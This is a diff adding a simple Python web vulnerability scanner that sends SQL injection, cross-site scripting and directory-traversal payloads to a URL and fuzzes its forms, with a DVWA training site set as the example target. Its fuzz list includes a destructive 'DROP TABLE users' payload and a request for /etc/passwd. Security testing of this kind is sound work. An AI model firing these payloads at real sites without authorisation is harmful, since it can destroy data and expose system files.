@@ -1,0 +1,91 @@
+import requests
+from bs4 import BeautifulSoup
+
+def check_sql_injection(url):
+    """
+    Check for SQL Injection vulnerability by injecting common SQL payloads.
+    """
+    payloads = ["' OR 1=1 --", "' OR 'a'='a", "' OR '1'='1", "' OR ''='", "' OR 1=1#"]
+    vulnerable = False
+    for payload in payloads:
+        r = requests.get(url + payload)
+        if "error" in r.text or "syntax" in r.text or "sql" in r.text:
+            vulnerable = True
+            print(f"[SQL Injection] Potential vulnerability found with payload: {payload}")
+            break
+    if not vulnerable:
+        print("[SQL Injection] No vulnerabilities found.")
+
+def check_xss(url):
+    """
+    Check for Cross-Site Scripting (XSS) vulnerability by injecting a simple XSS payload.
+    """
+    payload = "<script>alert('XSS')</script>"
+    r = requests.get(url + payload)
+    if payload in r.text:
+        print("[XSS] Potential XSS vulnerability found!")
+    else:
+        print("[XSS] No XSS vulnerabilities found.")
+
+def check_directory_traversal(url):
+    """
+    Check for Directory Traversal vulnerability by navigating to parent directories.
+    """
+    payload = "../../../../../../etc/passwd"
+    r = requests.get(url + payload)
+    if "root:" in r.text:  # Typical contents of /etc/passwd on Linux systems
+        print("[Directory Traversal] Vulnerability found! /etc/passwd is accessible.")
+    else:
+        print("[Directory Traversal] No directory traversal vulnerabilities found.")
+
+def fuzz_inputs(url):
+    """
+    Fuzz input fields to discover vulnerabilities by sending random payloads.
+    """
+    fuzz_payloads = ["<script>alert('test')</script>", "'; DROP TABLE users; --", "../../../../etc/passwd"]
+    r = requests.get(url)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    
+    forms = soup.find_all('form')
+    if not forms:
+        print("[Fuzzing] No forms found to fuzz.")
+        return
+    
+    for form in forms:
+        action = form.get('action')
+        method = form.get('method', 'get').lower()
+        inputs = form.find_all('input')
+        
+        for payload in fuzz_payloads:
+            data = {input.get('name'): payload for input in inputs if input.get('type') != 'submit'}
+            if method == 'post':
+                r = requests.post(url + action, data=data)
+            else:
+                r = requests.get(url + action, params=data)
+            
+            if payload in r.text:
+                print(f"[Fuzzing] Potential vulnerability found with payload: {payload}")
+            else:
+                print(f"[Fuzzing] No vulnerability found with payload: {payload}")
+
+def perform_penetration_test(url):
+    """
+    Perform penetration testing by checking for common vulnerabilities.
+    """
+    print(f"[*] Testing URL: {url}")
+    
+    # Check for SQL Injection
+    check_sql_injection(url)
+
+    # Check for XSS
+    check_xss(url)
+
+    # Check for Directory Traversal
+    check_directory_traversal(url)
+    
+    # Fuzz inputs to discover vulnerabilities
+    fuzz_inputs(url)
+
+# Example usage:
+target_url = "https://www.dvwa.co.uk/"
+perform_penetration_test(target_url)
